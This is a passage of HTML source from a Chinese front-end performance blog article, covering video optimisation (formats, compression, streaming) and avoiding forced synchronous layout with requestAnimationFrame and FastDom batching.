200w,\n/static/2021-07-23-00-22-33-2324ace05141e3a5fb8ac074ec7bda1b-69e4e.png 400w,\n/static/2021-07-23-00-22-33-2324ace05141e3a5fb8ac074ec7bda1b-05988.png 764w" data-sizes="(max-width: 764px) 100vw, 764px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<h2 id="视频"><a href="#%E8%A7%86%E9%A2%91" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>视频</h2>\n<p>视频作为一种重要的媒体形态，在网站中使用可以提高网站内容的丰富性，但同时对网络加载来说也是一个负担。所以会出现一些如下针对 Web 上视频的优化。</p>\n<h3 id="使用合适的视频格式"><a href="#%E4%BD%BF%E7%94%A8%E5%90%88%E9%80%82%E7%9A%84%E8%A7%86%E9%A2%91%E6%A0%BC%E5%BC%8F" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用合适的视频格式</h3>\n<p>与图片类似，不同的视频编码格式，其数据大小也大都不同。目前在 HTML5 Video 中常用的格式为 MPEG-4。除了 MPEG-4 之外，还支持一种叫 WebM 的新的视频格式。</p>\n<p>WebM(VP9) 相较于 MPEG-4(x264) 来说会更小，不过兼容性相对来说也较差。因此可以考虑在 <code class="language-text">&lt;video&gt;</code> 中指定多个 <code class="language-text">&lt;source&gt;</code>。</p>\n<html><head></head><body><div class="gatsby-code-button-container" data-toaster-id="55086274414909410000" data-toaster-class="gatsby-code-button-toaster" data-toaster-text-class="gatsby-code-button-toaster-text" data-toaster-text="复制成功" data-toaster-duration="3500" onclick="copyToClipboard(`<video>\n  <source data-src=&quot;/static/video/me.webm&quot; type=&quot;video/webm&quot; />\n  <source src=&quot;/static/video/me.mp4&quot; type=&quot;video/mp4&quot; />\n</video>`, `55086274414909410000`)">\n              <div class="gatsby-code-button" title="html">\n                <span class="gatsby-code-button-language">html</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div></body></html>\n<div class="gatsby-highlight" data-language="html"><pre style="counter-reset: linenumber NaN" class="language-html line-numbers"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>video</span><span class="token punctuation">></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static/video/me.webm<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/webm<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>source</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/static/video/me.mp4<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>video/mp4<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>\n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>video</span><span class="token punctuation">></span></span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>此外，使用 AV1 编码会比 VP9(WebM) 小约 30%，比 x264(MPEG-4) 小约 45-50%。</p>\n<h3 id="视频压缩"><a href="#%E8%A7%86%E9%A2%91%E5%8E%8B%E7%BC%A9" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>视频压缩</h3>\n<p>对于视频，我们也可以进行有损与无损压缩，同样可以有效减少视频大小。下面列举了一些常用的工具：</p>\n<ul>\n<li>HandBrake</li>\n<li>Freemake</li>\n<li>Hybrid</li>\n<li>MeGUI</li>\n</ul>\n<h3 id="移除不必要的音轨信息"><a href="#%E7%A7%BB%E9%99%A4%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E9%9F%B3%E8%BD%A8%E4%BF%A1%E6%81%AF" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>移除不必要的音轨信息</h3>\n<p>在上一节中我们提到，可以使用 <code class="language-text">&lt;video&gt;</code> 代替 GIF 来实现动画，同时体积也会更小。由于在这种场景下本身就是不需要声音的，所以我们会将 <code class="language-text">&lt;video&gt;</code> 设置为 muted。</p>\n<p>那么，既然不需要声音，我们是不是可以直接移除掉音轨的数据？是的，这样做也会帮助进一步缩减视频的体积。</p>\n<h3 id="使用流"><a href="#%E4%BD%BF%E7%94%A8%E6%B5%81" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>使用“流”</h3>\n<p>尝试让浏览器使用“流”或者小分片的方式来播放你的视频，例如常用的 HLS (HTTP Live Streaming) 技术。简单来说，使用 HLS 技术，你的视频会包含一个 .m3u8 的索引文件和一系列包含播放内容的 .ts 分片。浏览器通过不断下载一小段的分片来进行视频播放，避免了完整视频下载的流量消耗。</p>\n<p>你也可以尝试使用 MPEG-DASH 这个技术，目前开源社区也有一个配套的客户端实现。</p>\n<h3 id="移除不必要的视频"><a href="#%E7%A7%BB%E9%99%A4%E4%B8%8D%E5%BF%85%E8%A6%81%E7%9A%84%E8%A7%86%E9%A2%91" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>移除不必要的视频</h3>\n<p>对于不需要使用视频的场景，最好的优化方法就是去掉视频。例如在小屏幕上，你可以通过媒体查询来避免下载视频：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="52714870210267726000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`@media screen and (max-width: 650px) {\n  #hero-video {\n    display: none;\n  }\n}`, `52714870210267726000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="css"\n              >\n                <span class="gatsby-code-button-language">css</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="css"><pre style="counter-reset: linenumber NaN" class="language-css line-numbers"><code class="language-css"><span class="token atrule"><span class="token rule">@media</span> screen and <span class="token punctuation">(</span><span class="token property">max-width</span><span class="token punctuation">:</span> 650px<span class="token punctuation">)</span></span> <span class="token punctuation">{</span>\n  <span class="token selector">#hero-video</span> <span class="token punctuation">{</span>\n    <span class="token property">display</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>\n  <span class="token punctuation">}</span>\n<span class="token punctuation">}</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>关于视频的优化这里只介绍了一些基本的手段，但对于一个重度的视频网站来说，会包含例如播放器 SDK 的优化、数据预取、码率自适应等更多的优化内容，在 2019 GMTC 上，B 站分享了他们的缩减首帧耗时的一系列优化措施，所以这里算是一个抛砖引玉。</p>\n<p>此外，虽然上面介绍了一些视频处理的软件工具，但是如果有更高的定制化或集成需求，建议使用 <a href="https://www.ffmpeg.org/" target="_blank" rel="nofollow noreferrer noopener">FFmpeg</a> 或其背后的<a href="https://github.com/FFmpeg/FFmpeg#libraries" target="_blank" rel="nofollow noreferrer noopener">这些包</a>。</p>\n<h1 id="运行时"><a href="#%E8%BF%90%E8%A1%8C%E6%97%B6" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>运行时</h1>\n<h2 id="注意强制同步布局"><a href="#%E6%B3%A8%E6%84%8F%E5%BC%BA%E5%88%B6%E5%90%8C%E6%AD%A5%E5%B8%83%E5%B1%80" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>注意强制同步布局</h2>\n<h3 id="什么是强制同步布局"><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%BC%BA%E5%88%B6%E5%90%8C%E6%AD%A5%E5%B8%83%E5%B1%80" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>什么是强制同步布局</h3>\n<p>作为前端，大家应该对“强制同步布局”并不陌生。如果你不太了解，这里简单介绍一下。首先你需要知道的是，显示器有一个自己的刷新频率，例如每秒 60 次（60 FPS）。这就意味着，每过 16.6ms，浏览器就会将截止上次刷新后的元素变动应用到屏幕上。这里就不得不提到渲染管线了。</p>\n<p><html><head></head><body><a class="gatsby-resp-image-link" href="/static/2021-07-23-00-32-59-46e23a114177a5ebd5fe81223b1e351c-5fff1.png" style="display: block" target="_blank" rel="noopener">\n  \n  <span class="gatsby-resp-image-wrapper" style="position: relative; display: block; ; max-width: 800px; margin-left: auto; margin-right: auto;">\n    <span class="gatsby-resp-image-background-image" style="padding-bottom: 15.279048490393413%; position: relative; bottom: 0; left: 0; background-image: url(\'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAwklEQVQI1wG3AEj/APvx2Pbhq/fktPfksvjls93Q6M/C9NPH8tXK8tDD8dHD9NLO6MHdub/buMTevcPdvb/at8Dbub3attfo0wD23aDtvUPuyGPtxF70xUO3lLCXfO2ZfOCZfeSZfeKdf+WUgNd1r2l0smRwr2FysWR1smd8tW1vrmCeyJQA+u/U9d2j9eCs9d+p9+Kq2MrkybrzzsDx0cTxzL7wzb3zzsnoutixttauvtq3vdm2t9awutizttWu0+fPJDKHP6AFq1oAAAAASUVORK5CYII=\'); background-size: cover; display: block;">\n      <img class="gatsby-resp-image-image lazy" style="width: 100%; height: 100%; margin: 0; vertical-align: middle; position: absolute; top: 0; left: 0; box-shadow: inset 0px 0px 0px 400px #fafafa;" alt="2021 07 23 00 32 59" title="" data-src="/static/2021-07-23-00-32-59-46e23a114177a5ebd5fe81223b1e351c-fee1c.png" data-srcset="/static/2021-07-23-00-32-59-46e23a114177a5ebd5fe81223b1e351c-a67b7.png 200w,\n/static/2021-07-23-00-32-59-46e23a114177a5ebd5fe81223b1e351c-0b187.png 400w,\n/static/2021-07-23-00-32-59-46e23a114177a5ebd5fe81223b1e351c-fee1c.png 800w,\n/static/2021-07-23-00-32-59-46e23a114177a5ebd5fe81223b1e351c-5fff1.png 1093w" data-sizes="(max-width: 800px) 100vw, 800px">\n    </span>\n  </span>\n  \n  </a>\n    </body></html></p>\n<p>在渲染管线中，有一步叫做 Layout，也就是布局。它会计算元素的大小、位置信息，而且一处的改动几乎会影响到整个文档页面。所以 Layout 的消耗是非常巨大的。而我们所说的 reflow（firefox）与 layout（Chrome/Opera/Safari/IE），都是指的这一过程。另一方面，渲染线程和 JavaScript 执行线程是互斥的，所以这 16.6ms 还会被 JavaScript 的执行所瓜分，可见时间并不那么“富裕”。</p>\n<p>我们先来看一段代码：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="88057840052337900000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`var \\$ele = document.getElementById(\'main\');\nvar height = \\$ele.offsetHeight;\n// ……`, `88057840052337900000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">var</span> $ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'main\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> height <span class="token operator">=</span> $ele<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>\n<span class="token comment">// ……</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<p>上述代码获取了元素的 offsetHeight 值，浏览器此时会使用上一次渲染后的缓存值进行返回，所以浏览器消耗并不大。</p>\n<p>而有一些 JavaScript 操作会导致浏览器需要提前执行布局操作，这种操作就被称为“强制同步布局”。我们把上面的代码改成如下所示：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="17494418432555192000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`var \\$ele = document.getElementById(\'main\');\n\\$ele.classList.remove(\'large\');\nvar height = \\$ele.offsetHeight;\n// ……`, `17494418432555192000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">var</span> $ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'main\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n$ele<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">\'large\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token keyword">var</span> height <span class="token operator">=</span> $ele<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>\n<span class="token comment">// ……</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>由于我们在修改元素的 className 后又立刻获取了它的高度，为了保证高度值正确，浏览器会立即进行布局，然而我们的本意可能并非如此 —— 也许 large 并不会影响高度，也许我们只是想获取上一帧的结果…… 针对这种目的，下面的写法会更合适，同时可以避免强制同步布局。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="10816774545894070000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`var height = \\$ele.offsetHeight;\nvar \\$ele = document.getElementById(\'main\');\n\\$ele.classList.remove(\'large\');\n// ……`, `10816774545894070000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js"><span class="token keyword">var</span> height <span class="token operator">=</span> $ele<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>\n<span class="token keyword">var</span> $ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'main\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n$ele<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">\'large\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n<span class="token comment">// ……</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>从这个例子可以看到，我们很可能一不小心就触发了强制同步布局。除了上例中的 offsetHeight，还有许多会触发强制同步布局的属性。而 CSS Triggers 这个网站在 Layout 之外，列出了各个浏览器中会触发 Paint 和 Composite 的 CSS 属性。</p>\n<h3 id="尝试使用-raf-避免强制同步布局"><a href="#%E5%B0%9D%E8%AF%95%E4%BD%BF%E7%94%A8-raf-%E9%81%BF%E5%85%8D%E5%BC%BA%E5%88%B6%E5%90%8C%E6%AD%A5%E5%B8%83%E5%B1%80" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>尝试使用 RAF 避免强制同步布局</h3>\n<p>在强制同步布局的问题上，还有一些更严重的列子，例如在循环中不断触发强制同步布局。</p>\n<p>如果你希望避免在浏览器进行页面重绘后执行一些操作，你可以使用 requestAnimationFrame API。由于上一帧的旧布局值是可以直接获取的，所以我们可以将布局查询的操作放在 requestAnimationFrame 中。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="22618522181713140000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`window.requestAnimationFrame(() => {\n  var \\$ele = document.getElementById(\'main\');\n  var height = \\$ele.offsetHeight;\n  // ……\n});`, `22618522181713140000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n  <span class="token keyword">var</span> $ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'main\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">var</span> height <span class="token operator">=</span> $ele<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>\n  <span class="token comment">// ……</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>但是请注意，如果像下面这样犯了和之前一样的错误，在查询布局之前设置了新的元素样式/布局属性，那使用了 requestAnimationFrame 也无法避免性能问题。</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="12082707771431610000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`window.requestAnimationFrame(function() {\n  var \\$ele = document.getElementById(\'main\');\n  \\$ele.classList.remove(\'large\');\n  var height = \\$ele.offsetHeight;\n  // ……\n});`, `12082707771431610000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">window<span class="token punctuation">.</span><span class="token function">requestAnimationFrame</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>\n  <span class="token keyword">var</span> $ele <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">\'main\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  $ele<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">\'large\'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>\n  <span class="token keyword">var</span> height <span class="token operator">=</span> $ele<span class="token punctuation">.</span>offsetHeight<span class="token punctuation">;</span>\n  <span class="token comment">// ……</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id="批量化你的操作"><a href="#%E6%89%B9%E9%87%8F%E5%8C%96%E4%BD%A0%E7%9A%84%E6%93%8D%E4%BD%9C" aria-hidden="true" class="anchor"><svg aria-hidden="true" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>批量化你的操作</h3>\n<p>批量化是计算机程序优化中的重要手段之一。例如一些数据库在写操作上最终也是会将其批量化后再统一进行磁盘 I/O。所以对于元素布局的查询操作，我们也可以尝试使用这种手段。我们可以将这些操作批量化存储下来，等到下一次 requestAnimationFrame 触发时一起执行。FastDom 就是一个帮你封装了这类操作的开源库。</p>\n<blockquote>\n<p>By batching DOM access we avoid unnecessary document reflows and dramatically speed up layout performance. Each measure/mutate job is added to a corresponding measure/mutate queue. The queues are emptied (reads, then writes) at the turn of the next frame using window.requestAnimationFrame.</p>\n</blockquote>\n<p>上面是它的基本工作原理，和我们提到的思路是一样的。基本的使用方法如下：</p>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="63869896501482650000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`fastdom.measure(() => {\n  const width = element.clientWidth;\n});`, `63869896501482650000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">fastdom<span class="token punctuation">.</span><span class="token function">measure</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>\n  <span class="token keyword">const</span> width <span class="token operator">=</span> element<span class="token punctuation">.</span>clientWidth<span class="token punctuation">;</span>\n<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code><span aria-hidden="true" class="line-numbers-rows" style="white-space: normal; width: auto; left: 0;"><span></span><span></span><span></span></span></pre></div>\n<div\n              class="gatsby-code-button-container"\n              data-toaster-id="74389108624197760000"\n              data-toaster-class="gatsby-code-button-toaster"\n              data-toaster-text-class="gatsby-code-button-toaster-text"\n              data-toaster-text="复制成功"\n              data-toaster-duration="3500"\n              onClick="copyToClipboard(`fastdom.mutate(() => {\n  element.style.width = width + \'px\';\n});`, `74389108624197760000`)"\n            >\n              <div\n                class="gatsby-code-button"\n                title="js"\n              >\n                <span class="gatsby-code-button-language">js</span>\n                <span class="gatsby-code-button-text-icon">复制代码</span>\n              </div>\n            </div>\n<div class="gatsby-highlight" data-language="js"><pre style="counter-reset: linenumber NaN" class="language-js line-numbers"><code class="language-js">fastdom<span class="token punctuation">.</span><span class="token 